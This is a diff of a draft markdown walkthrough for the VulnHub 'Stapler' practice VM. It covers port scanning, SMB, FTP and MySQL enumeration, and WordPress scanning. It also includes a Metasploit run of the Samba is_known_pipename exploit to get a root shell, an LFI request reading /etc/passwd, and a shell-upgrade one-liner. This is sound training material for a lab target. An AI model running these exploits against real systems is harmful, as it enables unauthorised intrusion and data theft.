@@ -2,39 +2,52 @@
 author: bhero
 topic: vulnHub
 ---
-Walkthrough for [Stapler](https://download.vulnhub.com/stapler/Stapler.zip)
+Walkthrough for BsidesLondon 2016 VM: [Stapler](https://download.vulnhub.com/stapler/Stapler.zip)
+
+### Todos
+
+* need images or outputs from triage!
+* fix the terminal outs to be plain code blocks and not bash
 
 ## Setup
+
+ > TODO walkthough for setup
+
 get stapler from the url above & setup vm: unzip and import
+
+
+-----------------------------
 
 ## Basic Enum
 
-ping scan, find the machine:
+First things first we need to find the machine. Lets use a ping scan:
 
-```
+``` bash
 nmap -T5 -sP 192.168.56.0-255
 ```
 
-> Bonus: Turbo Mode
-```
-nmap -T5 --max-parallelism=100 -sP 192.168.56.0/24 | awk -v RS='([0-9]+\\.){3}[0-9]+' 'RT{print RT}'
-```
+This returns a fair bit of output, but at this stage I really only care about the IP address at this stage.
 
-returns a couple
+We can cut all the surplus text out and multi-thread with the following command:
+
+``` bash
+nmap -T5 --max-parallelism=100 -sP 192.168.56.0/24 | awk -v RS='([0-9]+\\.){3}[0-9]+' 'RT{print RT}'
+# returns a couple of addresses quickly
 192.168.56.1
 192.168.56.104
+```
 
-lets assign the IP
+because I'm lazy I'll assign the IP Address to a variable:
 
 ``` bash
 STAPLER_IP=192.168.56.104
 ```
 
-Quick scan the services
+Typically I'll run nmap in various levels of aggression, starting with a quick scan of the services:
 
 ``` bash
 nmap $STAPLER_IP
-#gives us:
+# gives us:
 Host is up (0.00055s latency).
 Not shown: 992 filtered ports
 PORT     STATE  SERVICE
@@ -48,8 +61,7 @@ PORT     STATE  SERVICE
 3306/tcp open   mysql
 ```
 
-Interesting, lots of ports open, doom? - What is that?
-Lets check for hidden ports before we deep dive
+Interesting, lots of ports open, doom? - What is that? We'll check later but for now I'm going to check for hidden ports with a guess at versioning before we deep dive:
 
 ``` bash
 sudo nmap -sV -p- $STAPLER_IP 
@@ -115,43 +127,63 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 115.90 seconds
 ```
 
+-----------------------------
+
 ## Triage
 
+Before going any further it's prudent to perform a little analysis to get an idea of what we are facing.
+
+```
 20/tcp    closed ftp-data
 21/tcp    open   ftp         vsftpd 2.0.8 or later
+```
 
 There is an FTP server, probrably an Active server as port 20 returns closed. In passive mode the client initiates the connection and port 20 rarely refuses connection. This might imply IP whitelisting
 
+```
 22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+```
 
 Suggestive that box is Linux, windows rarely uses port 22 for ssh. This service will be hard to interact with if we can't get valid credentials 
 
+```
 53/tcp    open   domain      dnsmasq 2.75
+```
 
 DNS is often used to hide useful features on box via whitelisting. This is particularly true in more advanced boxes in VulnHub. It is difficult to enumerate without configuring networking on the attacker box, but can often be used for a quick enumeration win. I
 
+```
 80/tcp    open   http        PHP cli server 5.5 or later
 12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
+```
 
 HTTP servers are open by default. This is typically the best place to start when enumerating a server as web sites are great places to get RCE.
 
+```
 123/tcp   closed ntp
+```
 
 Network Time, useful to know it is closed but no help just now
 
+```
 137/tcp   closed netbios-ns
 138/tcp   closed netbios-dgm
 139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+```
 
 SMB uses either IP port 139 or 445. SMB originally ran on top of NetBIOS using port 139. NetBIOS is an older transport layer that allows Windows computers to talk to each other on the same network. Later versions of SMB (after Windows 2000) began to use port 445 on top of a TCP stack. Using TCP allows SMB to work over the internet. The supporting ports 137 (name service) and 138 (datagram) are used for NetBIOS on the WinTEL stack. This helps nmap best guess a Linux service, interesting that we are using 139 and NOT 445.
 
+```
 3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
+```
 
-Standard port for mysqldb access, this should be set to local host-only access. Usually requires a login. Confirms that we have a LAMP stack on the box, and if we were bad guys this would be a value extraction service.
+Standard port for mysqldb access, this _should_ be set to local host-only access, could be useful but normally requires a login. Confirms that we have a LAMP stack on the box, and if we were bad guys this would be a value extraction service.
 
+```
 666/tcp   open   doom?
+```
 
-For me, this is the most intersting port doom. Historically is the port for doom by Id Software, yet when we run the nmap scan we get what looks like ascii code:
+For me, this is the most intersting port. Historically is the port for [Doom](https://store.steampowered.com/app/2280/Ultimate_Doom/) by Id Software and tradtionally games make good areas to [exploit](https://www.exploit-db.com/exploits/30630). Yet when we run the nmap scan, we get what looks like an ascii output:
 
 ```
 SF-Port666-TCP:V=7.70%I=7%D=8/4%Time=5D470155%P=x86_64-pc-linux-gnu%r(NULL
@@ -195,21 +227,18 @@ SF:\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
 ```
 Could this be a custom app? Not low hanging fruit but possibly something interesting. 
 
-### Pro/Con Summary
-
-1. HTTP: Easy and safe to access - big target space 
-2. DNS: Easy for quick enumeration - complex, requires configuration
-3. FTP: Smaller target, value extraction - may need auth, unsafe
-3. SAMBA: Smaller target, value extraction - may need auth, unsafe
-4. DOOM 666: Unkown service - Risky
-5. MySQL: Value extraction - may need auth, unsafe
-6. SSH: Server Control - may need auth, unsafe
-
+-----------------------------
 ## Lets go Harder
 
-Start port 53, it is quickest to check for special info and is easy to queue up scripts for.
+Time to get more intrusive with our recon.
 
+### DNS
+
+Start port 53, it is quickest to check for special info and is easy to queue up scripts for.
 launching the following script is noisy, but useful for dns services 
+
+> TODO get outputs
+
 ``` bash
 sudo nmap -Pn -sU -p 53 --script=dns* $STAPLER_IP
 ```
@@ -221,9 +250,10 @@ Lets investigate,
 nslookup $STAPLER_IP
 ** server can't find 104.56.168.192.in-addr.arpa: NXDOMAIN
 ``` 
-Ah, the VM is not recognised on our DNS. This is pretty typical of Vulnhub Boxes as they aren't on our `real` network. We could set this to our /etc/hosts and continue our hunt, we won't for now as we have no idea what else there is. 
-Lets run some manual testing, open interactive nslookup with ```nslookup```
-we can play with the following commands
+Ah, the VM is not recognised on our DNS. This is pretty typical of Vulnhub Boxes as they aren't on our `real` network. We could set this to our /etc/hosts and continue our hunt, we won't for now as we have no idea what else there is and the configuration may be unesessary. 
+Lets go into manual mode, open interactive nslookup with ```nslookup``` to play with the following commands:
+
+> TODO get outputs
 
 ``` bash
 # list primary domain server: 
@@ -235,20 +265,21 @@ set type=any
 server 192.168.56.104
 # Query new dns server for all records
 192.168.55.104
-```
-comes back
-```
+# comes back
 ** server can't find 104.55.168.192.in-addr.arpa: REFUSED
 ```
-darn, no quick wins here because we don't have permissions. Might be something we can play with later, lets park DNS for now and move on to something else.
+Darn, no quick wins here because we don't have permissions. Might be something we want to play with later, but lets park DNS for now and move on to something else.
+
+-----------------------------
 
 ## SAMBA
 
-lets aggressive scan the service to get an idea of what we have
+Lets aggressive scan the service to get an idea of what we have
 
-```bash
+``` bash
 nmap -A -p 139 $STAPLER_IP
-# returns
+
+#returns
 Nmap scan report for 192.168.56.104
 Host is up (0.00034s latency).
 
@@ -281,13 +312,18 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 41.52 seconds
 ```
+
 the __smb-security-mode__ script suggests we can enumerate with a guest login.
 
-A quick(ish) scripted enum to file for the server can be done via ```enum4linux``
-```
+A quick(ish) scripted enum to file for the server can be done via ```enum4linux```
+> TODO link file
+
+``` bash
 sudo enum4linux -U -S -G -P -o -n -i $STAPLER_IP > samba_enum.txt
 ```
-but we're going oldschool:
+> TODO get outputs
+
+But we'll go oldschool:
 ``` bash
 smbclient -L $STAPLER_IP
 # blank password gives
@@ -299,29 +335,70 @@ smbclient -L $STAPLER_IP
  tmp             Disk      All temporary files should be stored here
  IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
 Reconnecting with SMB1 for workgroup listing.
-```
-on examination as kathy (//fred/kathy also works)
-``` bash
+
+# on examination as kathy (//fred/kathy also works)
+
 smbclient //kathy/kathy -I $STAPLER_IP -N
 ls
-cd kathy stuff\ #might need to tab it in!
+cd kathy stuff\ # might need to tab it in!
 get todo-list.txt
 cd ..\backup
-# ooh wordpress-4.tar.gz, could be interesting for source code review but useful for http
+# ooh wordpress-4.tar.gz, could be interesting for source code review useful for http
+get wordpress-4.tar.gz
+# ftp config as well
 get vsftpd.conf
-```
-```
+
 smbclient //kathy/tmp -I $STAPLER_IP -N
 get ls
 ```
 
 we can determin a few things from these files:
-FTP has anon login
-fred and kathy are both users
+FTP has anon login and fred and kathy are both users
+
+> __BONUS__ Eternal Red Exploit to root: 
+
+We get a lot of good info, but the information that is of most interest is the Samba version as 4.3.9-Ubuntu is vulnerable to Eternal Red
+
+> TODO get outputs
+
+``` bash
+searchsploit samba 4
+# gives us
+Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)                          | exploits/linux/remote/42084.rb
+```
+
+
+ok, from experience this should be a point and shoot to win.
+lets fie up msf:
+
+> TODO get outputs
+
+``` bash
+mfsconsole
+search is_known_pipename
+use exploit/linux/samba/is_known_pipename 
+show options
+set RHOSTS 192.168.56.104 #
+set RPORT 139
+set payload cmd/unix/interact
+run
+
+#this should get a shell, spawn a bash one:
+python -c 'import pty; pty.spawn("/bin/bash")'
+#then show root
+id
+```
+
+Confession time, we cheated a little as this exploit came out after the box was made.
+Lets dig a bit deeper.
 
 -----------------------------
 
-Lets look at ftp
+### FTP
+
+Lets look at the ftp service: 
+
+> TODO get outputs
 
 ``` bash
 ftp $STAPLER_IP 
@@ -332,20 +409,24 @@ ls
 get note
 ```
 After reading the note, elly is another user, and she has an ftp account!
-not much else we can do from here without going fully on the offensive, lets move on.
+Not much else we can do from here without going fully on the offensive, lets move on.
 
 -----------------------------
-
+### DOOM
 
 Port 666 is interesting, it looks like we might have a potential custom app.
 lets investigate with nc
 
+> TODO get outputs
+
 ``` bash
-# connect to vitim on port 666
+# connect to victim on port 666
 nc $STAPLER_IP 666
 ```
 
-This gives us what looks like binary data, lets stick it in a file and see what we have.
+This gives us what looks like binary data, lets stick it in a file and see what kind of data we have.
+
+> TODO get outputs
 
 ``` bash
 nc $STAPLER_IP 666 > doom && file doom
@@ -355,15 +436,15 @@ doom: Zip archive data, at least v2.0 to extract
 mv doom doom.zip && unzip doom.zip
 ```
 
-this gives us a message2.jpg
+> TODO get outputs
+
+this gives us ![message2.jpg](/assets/vulnhub_stuff/message2.jpg)
 ``` bash
 #check the jpeg for hidden stuff:
 file message2.jpg 
 strings message2.jpg
 # maybe an actual cookie? potentially just an easter egg though.
 ```
-
-![message2.jpg](/assets/vulnhub_stuff/message2.jpg)
 
 We get another potential user, scott
 
@@ -377,14 +458,16 @@ this takes us up to 5 users:
 
 -----------------------------
 
+### MySQL
 Time to try mysql
+
+> TODO get outputs
 
 ```
 nmap -A -p 3306 $STAPLER_IP
 ```
 
-I get some useful info, but nothing I can leverage
-I try logging in as root
+I get some useful info, but nothing I can leverage immediately, I try logging in as root:
 ``` bash
 mysql -h $STAPLER_IP -u root -p
 #use toor to try
@@ -397,17 +480,22 @@ I could try force my hand and brute force in, I have some usernames but there ar
 
 -----------------------------
 
-ssh is next, 
+### SSH
+ssh is next: 
+
+> TODO get outputs
 
 ``` bash
 nmap -A -p 22 $STAPLER_IP
 ```
 gives a pretty standard response, but we get barry, another user from:
 
+> TODO get outputs
+
 ``` bash
 ssh root@$STAPLER_IP
 ```
-At this point I have a decent userlist starting to pop up
+At this point I have a decent userlist starting to appear
 
 1. fred - smb
 2. kathy - smb
@@ -416,33 +504,27 @@ At this point I have a decent userlist starting to pop up
 5. scott - DOOM
 6. barry - ssh
 
-We'll park this for later and move onto the last services
+We'll park this for later, but lets take stock before we start on the http services.
+
+We have the userlist above, we know the server is a development system based on the comments found in the services.
+We know to look for a LAMP stack with Wordpress on Ubunbtu.
+The MySql is open, but password protected.
+FTP and Samba may offer us a potential file upload IF we can gain more leverage.
 
 -----------------------------
 
-Before we start on the http services, lets take stock.
-
-We have a user list:
-
-1. fred - smb
-2. kathy - smb
-3. harry - ftp
-4. elly - ftp
-5. scott - DOOM
-6. barry - ssh
-
-We know the server is a development system, with the comments left in the services.
-We know to look for a LAMP stack with Wordpress on Ubunbtu.
-The MySql is open, but password protected.
-FTP and Samba may offer us a file upload IF we fail to exploit the we service.
-
+### HTTP
 lets check the default website
+
+> TODO get outputs
 
 ```
 curl http://192.168.56.104/
 ```
 returns a 404, no webroot? interesting could be a dead site.
-Lets try a nickto scan to see what we pick up
+Lets try a nikto scan to see what we pick up
+
+> TODO link file
 
 ```
 nikto -h $STAPLER_IP > HTTP80.txt 
@@ -452,7 +534,9 @@ Yeilds nothing, lets try the other one:
 ```
 curl http://192.168.56.104:12380
 ```
-wow, big info lets put it in a file:
+wow, lets put it in a file as the output is huge:
+
+> TODO link file
 
 ```
 curl http://192.168.56.104:12380 > 12380_index.html
@@ -473,7 +557,9 @@ Viewing in the browser loads the index page, but the reload is strange almost a 
 curl http://192.168.56.104:12380/robots.txt
 ```
 
-get the same result. Looks like I'm stuck, try nikto again
+I get the same result. Looks like I'm stuck, but I'll try nikto again
+
+> TODO get outputs
 
 ```
 nikto -h $STAPLER_IP:12380 > HTTP12380.txt
@@ -486,11 +572,11 @@ looking at it shows 2 hits from robots.txt:
 and one from brute force:
 * /phpmyadmin/
 
-This is weird, lets try a curl for headers 
+This is weird, I wonder why I keep getting a redirect. Lets try a curl for headers 
 
 ``` bash 
 curl -I http://192.168.56.104:12380
-#note dave
+# note the dave header!
 HTTP/1.1 400 Bad Request
 Date: Sun, 04 Aug 2019 22:14:55 GMT
 Server: Apache/2.4.18 (Ubuntu)
@@ -510,15 +596,17 @@ curl https://192.168.56.104:12380/robots.txt
 # ah ha!
 curl: (60) SSL certificate problem: self signed certificate
 ```
-force ssl
+force insecure ssl because YOLO
 
 ``` bash
 curl https://192.168.56.104:12380/robots.txt -k
-# works
+# works! ha!
 User-agent: *
 Disallow: /admin112233/
 Disallow: /blogblog/
 ```
+
+> TODO get outputs
 
 lets try the sites:
 ``` bash
@@ -543,9 +631,11 @@ phpmyadmin traditionally is a good value extraction and has potential for RCE if
 
 This line, suggests we are looking at version 4.5.4.1. We can't be 100%, but the site looks like a default configuration, making this a hard sell without access.
 
-```html
+``` html
 <link rel="stylesheet" type="text/css" href="./themes/pmahomme/css/printview.css?v=4.5.4.1deb2ubuntu1" ....
 ```
+
+> TODO get outputs
 
 ``` bash
 searchsploit phpmyadmin
@@ -559,6 +649,8 @@ Lets check if there is a default admin page: https://192.168.56.104:12380/blogbl
 
 theres a bit of a redirect, lets curl it and view the headers
 
+> TODO get outputs
+
 ```
 curl -k https://192.168.56.104:12380/blogblog/wp-admin -I
 curl -k https://192.168.56.104:12380/blogblog/wp-admin -IL
@@ -571,7 +663,7 @@ A source code audit is not my strong suit, I'll put a pin in that to revisit.
 Instead lets look to WP to see if it is carrying any of its halmark weaknesses... users and plugins!
 
 first lets kick off a nikto scan:
-```
+``` bash
 nikto -h https://192.168.56.104:12380/blogblog/ > HTTPSblogblog.txt
 ```
 
@@ -583,6 +675,8 @@ wpscan --url https://192.168.56.104:12380/blogblog/ --enumerate u --disable-tls-
 ```
 
 wpscan also has a mode for checking vuln plugins, but I typically have limited success in determining _vulnerable_ plugins with this tool, we'll search for all plugins and check manually.
+
+> TODO link file
 
 ```
 wpscan --url https://192.168.56.104:12380/blogblog/ --enumerate ap --disable-tls-checks --plugins-detection aggressive -o wpscan_plugins.txt
@@ -599,7 +693,7 @@ WordPress Plugin Advanced Video 1.0 - Local File Inclusion                      
 
 LFI... now we are talking!
 
-```
+``` bash
 cp /usr/share/exploitdb/exploits/php/webapps/39646.py .
 ```
 
@@ -608,7 +702,11 @@ http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=
 
 if we go to ```https://192.168.56.104:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=/etc/passwd``` we should create a file upload with the contents of /etc/passwd.
 
-the exploit produces a success of sorts and a url. Following the url we get a 404. hmmmm so what happened? 
+the exploit produces a success of sorts and a url.
+
+> TODO get outputs
+
+Following the url we get a 404. hmmmm so what happened? 
 
 
 
@@ -618,6 +716,7 @@ Well lets look at what the plugin does
 /blogblog/wp-content/uploads/
 
 > Bonus Shell upgrade - TODO
+
 ``` bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 # background with Ctl^Z
@@ -627,30 +726,5 @@ fg
 
 # Hit Hard!
 
-## Eternal Red Exploit to root: 
 
-We get a lot of good info, but of most interest is the Samba version: 4.3.9-Ubuntu
-
-searchsploit samba 4.
-``` bash
-Samba 3.5.0 < 4.4.14/4.5.10/4.6.4 - 'is_known_pipename()' Arbitrary Module Load (Metasploit)                          | exploits/linux/remote/42084.rb
-```
-
-ok, this should be a point, aim and shoot win.
-lets fie up msf:
-``` bash
-mfsconsole
-search is_known_pipename
-use exploit/linux/samba/is_known_pipename 
-show options
-set RHOSTS 192.168.56.104 #
-set RPORT 139
-set payload cmd/unix/interact
-run
-
-#this should get a shell, spawn a bash one:
-python -c 'import pty; pty.spawn("/bin/bash")'
-#then show root
-id
-```
 
